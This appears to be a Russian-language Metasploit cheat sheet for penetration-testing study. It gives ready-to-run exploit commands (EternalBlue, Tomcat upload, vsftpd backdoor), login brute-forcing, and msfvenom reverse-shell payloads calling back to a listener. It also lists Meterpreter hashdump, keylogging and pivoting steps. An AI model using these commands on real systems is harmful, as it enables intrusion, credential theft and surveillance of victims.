METASPLOIT
=======================
ЗАПУСК
========================
msfconsole
Обновление БД (если используется PostgreSQL):
msfdb init
msfdb start
Проверка БД:
db_status
========================
2. БАЗОВЫЕ КОМАНДЫ
help
search smb
search type:exploit
search cve:2021
search name:ftp
info exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms17_010_eternalblue
back
show options
show payloads
show targets

set RHOSTS 10.0.0.10
set RPORT 445
set LHOST 10.0.0.5
set LPORT 4444

[RHOSTS — IP цели
RPORT — порт цели
LHOST — твой IP (куда придёт shell)
LPORT — порт для обратного соединения]

run
exploit
Фоновый режим:
exploit -j

========================
3. РАБОТА С СЕССИЯМИ

Показать сессии:
sessions

Подключиться:
sessions -i 1

Фон:
background

Закрыть:
sessions -k 1

========================
4. СКАНИРОВАНИЕ (AUXILIARY)
[use auxiliary/scanner/smb/smb_version
Проверяет версию SMB.

use auxiliary/scanner/ftp/anonymous
Проверяет, разрешён ли anonymous FTP.

use auxiliary/scanner/mysql/mysql_login
Проверяет логин/пароль к MySQL.

Auxiliary модули не дают shell.]


Поиск:
search scanner

SMB версия:
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.10
run

FTP anonymous:
use auxiliary/scanner/ftp/anonymous
set RHOSTS 10.0.0.10
run

SMTP relay:
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS 10.0.0.10
run

MySQL login:
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 10.0.0.10
set USERNAME root
set PASS_FILE passwords.txt
run

SSH login:
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.0.10
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

HTTP dirs:
use auxiliary/scanner/http/dir_scanner
set RHOSTS 10.0.0.10
run

========================
5. MS17-010

Проверка:
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.0.0.10
run

Эксплуатация:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.10
set LHOST 10.0.0.5
set payload windows/x64/meterpreter/reverse_tcp
run

========================
6. FTP ЭКСПЛОИТЫ

search ftp

Пример:
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.0.10
run

========================
7. WEB ЭКСПЛОИТЫ

search type:exploit platform:php

Пример:
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 10.0.0.10
set TARGETURI /
run

Tomcat:
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.0.0.10
set HttpUsername tomcat
set HttpPassword tomcat
run

========================
8. SQL SERVER

use auxiliary/scanner/mssql/mssql_login
set RHOSTS 10.0.0.10
set USERNAME sa
set PASS_FILE passwords.txt
run

========================
9. PAYLOADS

Показать payloads:
show payloads

Meterpreter:
windows/meterpreter/reverse_tcp
linux/x86/meterpreter/reverse_tcp

Обычный shell:
windows/shell/reverse_tcp
cmd/unix/reverse

========================
10. СОЗДАНИЕ PAYLOAD (MSFVENOM)
Создаёт исполняемый файл с reverse shell.

-p — payload
LHOST — твой IP
LPORT — порт
-f — формат
-o — имя файла
Используется если нужно загрузить файл на сервер.

Windows exe:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe

Linux:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o shell.elf

PHP:
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.php

========================
11. HANDLER (ПРИЁМ СОЕДИНЕНИЯ)

use exploit/multi/handler

Создаёт слушатель для обратного соединения.

set payload windows/meterpreter/reverse_tcp
Указываешь тип payload.

set LHOST 10.0.0.5
Твой IP.

set LPORT 4444
Порт прослушивания.

run

Ждёт подключения от цели.
run

========================
12. METERPRETER КОМАНДЫ

sysinfo
getuid
shell
pwd
ls
cd
download file.txt
upload shell.exe
ps
migrate PID
hashdump
screenshot
keyscan_start
keyscan_dump
getsystem
ipconfig
route

========================
13. ПЕРЕМЕЩЕНИЕ В СЕТИ (PIVOTING)

Добавить маршрут:
run autoroute -s 10.0.1.0/24

Или:
route add 10.0.1.0 255.255.255.0 1

Скан через pivot:
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.1.0/24
run

========================
14. ПОСТ-ЭКСПЛУАТАЦИЯ

search post/windows/gather

Сбор информации:
use post/windows/gather/hashdump
set SESSION 1
run

Информация о системе:
use post/windows/gather/enum_logged_on_users
set SESSION 1
run

========================
15.
Metasploit чаще всего нужен для:

Проверки MS17-010

Проверки слабых логинов (SSH, FTP, MySQL)

Загрузки reverse shell

Демонстрации пост-эксплуатации

Пивотинга при плохой сегментации

========================
16. ТИПОВОЙ АЛГОРИТМ

nmap -sV -sC -p-

Найти сервис

search в metasploit

use нужный модуль

show options

set RHOSTS

set LHOST

run

Получить сессию

Зафиксировать доказательства

========================
17. ЧАСТЫЕ ОШИБКИ

Не выставлен LHOST

Firewall блокирует обратное соединение

Неправильный payload (x86/x64)

Нет маршрута при pivoting

Забыли показать доказательства
